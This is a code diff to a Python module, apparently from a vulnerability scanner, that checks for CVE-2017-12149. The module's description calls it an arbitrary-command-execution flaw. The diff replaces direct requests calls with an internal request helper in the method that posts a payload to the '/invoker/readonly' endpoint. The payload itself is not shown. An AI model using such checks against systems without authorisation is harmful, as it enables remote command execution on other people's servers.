@@ -8,9 +8,8 @@ description: CVE-2017-12149漏洞可执行任意命令
 import re
 import sys
 import binascii
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.request import request
+
 
 class CVE_2017_12149_BaseVerify:
     def __init__(self, url):
@@ -119,7 +118,7 @@ class CVE_2017_12149_BaseVerify:
 
     def do_post(self, payload):
         payload_url = self.url + "/invoker/readonly"
-        result = requests.post(payload_url, payload, allow_redirects=False, verify=False)
+        result = request.post(payload_url, payload)
         result_content = result.content.decode(encoding='utf-8')
         return result_content
 
